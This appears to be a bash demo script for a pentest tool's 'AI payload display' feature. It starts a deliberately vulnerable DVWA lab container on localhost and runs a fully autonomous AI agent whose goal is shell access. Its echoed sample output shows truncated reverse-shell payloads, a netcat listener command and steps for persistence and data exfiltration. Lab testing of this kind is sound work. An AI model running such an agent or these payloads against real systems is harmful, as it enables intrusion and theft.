#!/bin/bash
# Test AI Payload Display & Shell Handling Feature
# This script demonstrates the new intelligent payload generation capabilities

echo "=============================================="
echo "🎯 AI PAYLOAD DISPLAY & SHELL HANDLING TEST"
echo "=============================================="
echo ""
echo "This will test Scorpion's new payload display features"
echo "against a safe, vulnerable lab environment (DVWA)"
echo ""

# Check if Docker is running
if ! docker ps &>/dev/null; then
    echo "❌ ERROR: Docker is not running or not installed"
    echo ""
    echo "Install Docker:"
    echo "  - Windows/macOS: https://www.docker.com/products/docker-desktop"
    echo "  - Linux: sudo apt install docker.io && sudo systemctl start docker"
    exit 1
fi

echo "[STEP 1] Setting up vulnerable target (DVWA)..."
echo ""

# Check if DVWA is already running
if docker ps | grep -q "web-dvwa"; then
    echo "✅ DVWA is already running on http://127.0.0.1:8080"
else
    echo "Starting DVWA container..."
    docker run -d -p 8080:80 --name dvwa-test vulnerables/web-dvwa
    
    if [ $? -eq 0 ]; then
        echo "✅ DVWA started successfully on http://127.0.0.1:8080"
        echo "⏳ Waiting 10 seconds for DVWA to initialize..."
        sleep 10
    else
        echo "❌ Failed to start DVWA. Trying to remove existing container..."
        docker rm -f dvwa-test 2>/dev/null
        docker run -d -p 8080:80 --name dvwa-test vulnerables/web-dvwa
        sleep 10
    fi
fi

echo ""
echo "[STEP 2] Verifying DVWA is accessible..."
if curl -s http://127.0.0.1:8080 | grep -q "DVWA"; then
    echo "✅ DVWA is accessible"
else
    echo "⚠️  WARNING: DVWA may not be ready yet. Continuing anyway..."
fi

echo ""
echo "[STEP 3] Running AI pentest with PAYLOAD DISPLAY..."
echo ""
echo "This will:"
echo "  ✅ Detect target OS (Linux/Docker)"
echo "  ✅ Find vulnerabilities (SQLi, XSS, RCE, File Upload)"
echo "  ✅ Generate OS-specific payloads (Bash, Python, Netcat, etc.)"
echo "  ✅ Display ALL payloads tested"
echo "  ✅ Show comprehensive shell handling guide"
echo "  ✅ Provide post-exploitation commands"
echo ""
echo "Press ENTER to start, or Ctrl+C to cancel..."
read

# Check if API key is set
if [ -z "$SCORPION_AI_API_KEY" ]; then
    echo "❌ ERROR: SCORPION_AI_API_KEY not set"
    echo ""
    echo "Get FREE GitHub Models token: https://github.com/marketplace/models"
    echo "Then run:"
    echo "  export SCORPION_AI_API_KEY='ghp_your_token_here'"
    echo ""
    exit 1
fi

echo ""
echo "🚀 Starting AI pentest with payload display..."
echo "=============================================="
echo ""

# Run AI pentest with HIGH risk to trigger payload display
scorpion ai-pentest \
  -t http://127.0.0.1:8080 \
  -r high \
  -g gain_shell_access \
  -a fully_autonomous \
  --time-limit 10 \
  --max-iterations 15

echo ""
echo "=============================================="
echo "✅ TEST COMPLETE"
echo "=============================================="
echo ""
echo "What you should see in the output above:"
echo ""
echo "1. OS FINGERPRINTING:"
echo "   [OS DETECTED] Linux Ubuntu or Docker environment"
echo ""
echo "2. VULNERABILITY DISCOVERY:"
echo "   [FOUND] SQLi, XSS, RCE, File Upload vulnerabilities"
echo ""
echo "3. PAYLOAD GENERATION:"
echo "   🎯 INTELLIGENT PAYLOAD GENERATION"
echo "     [TARGET OS] LINUX"
echo "     [VULN TYPE] Remote Code Execution"
echo "     [PAYLOAD #1] bash -i >& /dev/tcp/..."
echo "     [PAYLOAD #2] python -c 'import socket...'"
echo "     [TOTAL] Generated X payloads"
echo ""
echo "4. SHELL HANDLING GUIDE:"
echo "   🐚 SHELL HANDLING GUIDE"
echo "     [STEP 1] Setup Listener: nc -lvnp 4444"
echo "     [STEP 2] Execute Payload on TARGET"
echo "     [STEP 3] Upgrade to Interactive Shell"
echo "     [STEP 4] Post-Exploitation Commands"
echo "     [PERSISTENCE] Maintain Access"
echo "     [DATA EXFILTRATION] Steal Sensitive Files"
echo ""
echo "5. FINAL REPORT:"
echo "   Report saved: ai_pentest_127.0.0.1_YYYYMMDD_HHMMSS.json"
echo ""
echo ""
echo "[CLEANUP] To stop DVWA:"
echo "  docker stop dvwa-test && docker rm dvwa-test"
echo ""
echo "[NEXT STEPS]"
echo "1. Review the detailed payload output above"
echo "2. Check the JSON report for all findings"
echo "3. Try manual exploitation using displayed payloads"
echo "4. Read PAYLOAD_DISPLAY_GUIDE.md for more examples"
echo ""
echo "Happy Hacking! 🚀 (Authorized targets only!)"
